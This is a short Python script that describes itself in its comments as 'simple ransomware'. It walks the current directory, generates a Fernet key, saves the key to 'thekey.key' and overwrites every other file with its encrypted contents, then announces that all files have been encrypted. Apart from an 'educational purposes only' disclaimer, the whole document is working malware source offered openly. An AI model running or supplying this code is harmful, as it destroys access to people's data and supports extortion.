# file_encryptor.py
# This is a simple ransomware that encrypts files in the current directory
# It generates a key and saves it to a file called "thekey.key"
# It then encrypts all files in the current directory except itself and the key file
# and the decryptor script  
# It is intended for educational purposes only and should not be used for malicious purposes
# It is important to note that using ransomware is illegal and unethical.

import os
from cryptography.fernet import Fernet


files = []

# Get all files in the current directory except the script itself and the key file
# and the decryptor script and encrypt them    
for file in os.listdir():
    if file == "file_encryptor.py" or file == "thekey.key" or file == "file_decryptor.py": 
        continue
    if os.path.isfile(file):
        files.append(file)
        
print(files)   

# Generate a key for encryption  
key = Fernet.generate_key()


 # Save the key to a file called "thekey.key"
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypt all files in the current directory
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
    
print("All of your files have been encrypted")


